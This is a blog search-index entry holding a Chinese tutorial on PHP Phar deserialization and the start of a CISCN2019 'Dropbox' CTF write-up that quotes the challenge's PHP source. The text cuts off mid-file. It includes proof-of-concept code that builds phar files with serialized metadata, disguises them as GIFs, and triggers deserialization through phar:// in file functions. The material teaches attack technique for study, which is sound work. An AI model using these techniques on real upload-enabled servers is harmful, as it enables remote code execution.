<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Phar反序列化浅析</title>
      <link href="/2020/05/04/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/"/>
      <url>/2020/05/04/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://xz.aliyun.com/t/2958#toc-2" target="_blank" rel="noopener">Phar与Stream Wrapper造成PHP RCE的深入挖掘</a></li><li><a href="https://www.freebuf.com/articles/web/205943.html" target="_blank" rel="noopener">PHAR反序列化拓展操作总结</a></li><li><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">利用 phar 拓展 php 反序列化漏洞攻击面</a></li></ul><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><p><strong>①</strong>  <strong>a stub</strong></p><p>可以理解为一个标志，格式为<code>xxx</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则phar扩展将无法识别这个文件为phar文件。</p><p><strong>②</strong>  <strong>a manifest describing the contents</strong></p><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的<code>meta-data</code>，这是上述攻击手法最核心的地方。</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124151781.png" alt=""></p><p><strong>③</strong>  <strong>the file contents</strong></p><p>被压缩文件的内容。</p><p><strong>④</strong>  <strong>a signature for verifying Phar integrity (phar file format only)</strong></p><p>签名，放在文件末尾，格式如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504124231445.png" alt=""></p><p>通过<code>phar://</code>伪协议对一个<strong>phar</strong>文件进行了文件操作的时候，就可以触发反序列化，达到<strong>RCE</strong>的效果</p><h4 id="产生缘由"><a href="#产生缘由" class="headerlink" title="产生缘由"></a>产生缘由</h4><p>在<a href="https://github.com/php/php-src/blob/29b56a878aa22310d645c3266110417e07ebe683/ext/phar/phar.c#L618" target="_blank" rel="noopener">phar.c#L618</a>处，其调用了<code>php_var_unserialize</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120955832.png" alt=""></p><p><code>因此可以构造一个特殊的phar包，使得代码能够反序列化，从而构造一个pop链，在使用</code>phar://<code>协议读取文件的时候，文件会被解析成phar (https://www.php.net/manual/zh/intro.phar.php) 解析的过程会触发</code>php_var_unserialize`函数对<strong>meta-data</strong>的操作，造成反序列化。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><strong>条件</strong></p><ul><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ul><p>有序列化数据必然会有反序列化操作，php一大部分的<a href="http://php.net/manual/en/ref.filesystem.php" target="_blank" rel="noopener">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504120506980.png" alt=""></p><ul><li><strong>exif</strong>：<code>exif_thumbnail</code>，<code>exif_imagetype</code></li><li><strong>gd</strong>：<code>imageloadfont</code>，<code>imagecreatefrom***</code></li><li><strong>hash</strong>：<code>hash_hmac_file</code>，<code>hash_file</code>，<code>hash_update_file</code>，<code>md5_file</code>，<code>sha1_file</code></li><li><strong>file/url</strong>：<code>get_meta_tags</code>，<code>get_headers</code></li><li><strong>standard</strong>：<code>getimagesize</code>，<code>getimagesizefromstring</code></li></ul><p><strong>zip</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$zip = <span class="keyword">new</span> ZipArchive();</span><br><span class="line">$res = $zip-&gt;open(<span class="string">'c.zip'</span>);</span><br><span class="line">$zip-&gt;extractTo(<span class="string">'phar://test.phar/test'</span>);</span><br></pre></td></tr></table></figure><p>限制<code>phar://</code>不能出现在头几个字符，亦适用于<code>compress.zlib://</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$z = <span class="string">'compress.bzip2://phar:///home/sx/test.phar/test.txt'</span>;</span><br></pre></td></tr></table></figure><p><strong><a href="https://baike.baidu.com/item/PostgreSQL/530240?fr=aladdin" target="_blank" rel="noopener">PostgreSQL</a></strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$pdo = <span class="keyword">new</span> PDO(sprintf(<span class="string">"pgsql:host=%s;dbname=%s;user=%s;password=%s"</span>, <span class="string">"127.0.0.1"</span>, <span class="string">"postgres"</span>, <span class="string">"sx"</span>, <span class="string">"123456"</span>));</span><br><span class="line">@$pdo-&gt;pgsqlCopyFromFile(<span class="string">'aa'</span>, <span class="string">'phar://test.phar/aa'</span>);</span><br></pre></td></tr></table></figure><p><code>pgsqlCopyToFile</code>和<code>pg_trace</code>同样能使用的，需要开启<code>phar</code>的写功能。</p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>生成<strong>phar</strong>文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>notepad打开查看：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504131930692.png" alt=""></p><p>明显的序列化存储</p><p>构造利用代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Destruct called'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">'phar://phar.phar/a_random_string'</span>;</span><br><span class="line">    file_exists($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>成功打印结果，当然这里换其他的文件操作函数也可以</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132140672.png" alt=""></p><p><strong>将phar伪造成其他格式的文件</strong></p><p>在前面分析phar的文件结构时可能会注意到，php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>notepad打开查看：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504132602458.png" alt=""></p><p>和上面的一样可以利用成功</p><h3 id="栗子"><a href="#栗子" class="headerlink" title="栗子"></a>栗子</h3><h4 id="CISCN2019-华北赛区-Day1-Web1-—Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-—Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]—Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]—Dropbox</h4><p>界面：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212154616.png" alt=""></p><p>先随便注册一个账号登录，随后发现有上传文件和下载，删除文件的功能</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212308364.png" alt=""></p><p>测试文件上传，只能上传那三种图片的格式，应该是有白名单，且文件上传后路径不可知，于是抓包测试文件下载和删除功能，其中文件下载处存在文件下载漏洞，于是将整个网站的源码都下载下来，测试后发现，后台在下载界面还是做了权限限制的，不然根目录下的<code>flag</code>就可以直接下下来了</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504212700778.png" alt=""></p><p>有以下文件：</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B5%85%E6%9E%90/image-20200504213252372.png" alt=""></p><p>login.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">.........(HTML)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'register'</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;toast('注册成功', 'info');&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"username"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"password"</span>])) &#123;</span><br><span class="line">    $u = <span class="keyword">new</span> User();</span><br><span class="line">    $username = (string) $_POST[<span class="string">"username"</span>];</span><br><span class="line">    $password = (string) $_POST[<span class="string">"password"</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($username) &lt; <span class="number">20</span> &amp;&amp; $u-&gt;verify_user($username, $password)) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'login'</span>] = <span class="keyword">true</span>;</span><br><span class="line">        $_SESSION[<span class="string">'username'</span>] = htmlentities($username);</span><br><span class="line">        $sandbox = <span class="string">"uploads/"</span> . sha1($_SESSION[<span class="string">'username'</span>] . <span class="string">"sftUahRiTz"</span>) . <span class="string">"/"</span>;</span><br><span class="line">        <span class="keyword">if</span> (!is_dir($sandbox)) &#123;</span><br><span class="line">            mkdir($sandbox);</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'sandbox'</span>] = $sandbox;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;script&gt;window.location.href='index.php';&lt;/script&gt;"</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;toast('账号或密码错误', 'warning');&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>register.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">.........(HTML)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">"username"</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">"password"</span>])) &#123;</span><br><span class="line">    $u = <span class="keyword">new</span> User();</span><br><span class="line">    $username = (string) $_POST[<span class="string">"username"</span>];</span><br><span class="line">    $password = (string) $_POST[<span class="string">"password"</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($username) &lt; <span class="number">20</span> &amp;&amp; strlen($username) &gt; <span class="number">2</span> &amp;&amp; strlen($password) &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($u-&gt;add_user($username, $password)) &#123;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="string">"&lt;script&gt;window.location.href='login.php?register';&lt;/script&gt;"</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;script&gt;toast('此用户名已被使用', 'warning');&lt;/script&gt;"</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;toast('请输入有效用户名和密码', 'warning');&lt;/script&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>upload.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[<span class="string">"file"</span>])) &#123;</span><br><span class="line">    $filename = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">    $pos = strrpos($filename, <span class="string">"."</span>);</span><br><span class="line">    <span class="keyword">if</span> ($pos !== <span class="keyword">false</span>) &#123;</span><br><span class="line">        $filename = substr($filename, <span class="number">0</span>, $pos);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    $fileext = <span class="string">".gif"</span>;</span><br><span class="line">    <span class="keyword">switch</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/gif'</span>:</span><br><span class="line">            $fileext = <span class="string">".gif"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/jpeg'</span>:</span><br><span class="line">            $fileext = <span class="string">".jpg"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'image/png'</span>:</span><br><span class="line">            $fileext = <span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"Only gif/jpg/png allowed"</span>);</span><br><span class="line">            Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">            <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; strlen($filename) !== <span class="number">0</span>) &#123;</span><br><span class="line">        $dst = $_SESSION[<span class="string">'sandbox'</span>] . $filename . $fileext;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>], $dst);</span><br><span class="line">        $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">        Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">        <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"Invaild filename"</span>);</span><br><span class="line">        Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">        <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>download.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">ini_set(<span class="string">"open_basedir"</span>, getcwd() . <span class="string">":/etc:/tmp"</span>);</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename) &amp;&amp; stristr($filename, <span class="string">"flag"</span>) === <span class="keyword">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/octet-stream"</span>);</span><br><span class="line">    Header(<span class="string">"Content-Disposition: attachment; filename="</span> . basename($filename));</span><br><span class="line">    <span class="keyword">echo</span> $file-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File not exist"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$filename = (string) $_POST[<span class="string">'filename'</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen($filename) &lt; <span class="number">40</span> &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">true</span>, <span class="string">"error"</span> =&gt; <span class="string">""</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line">    $response = <span class="keyword">array</span>(<span class="string">"success"</span> =&gt; <span class="keyword">false</span>, <span class="string">"error"</span> =&gt; <span class="string">"File not exist"</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode($response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span 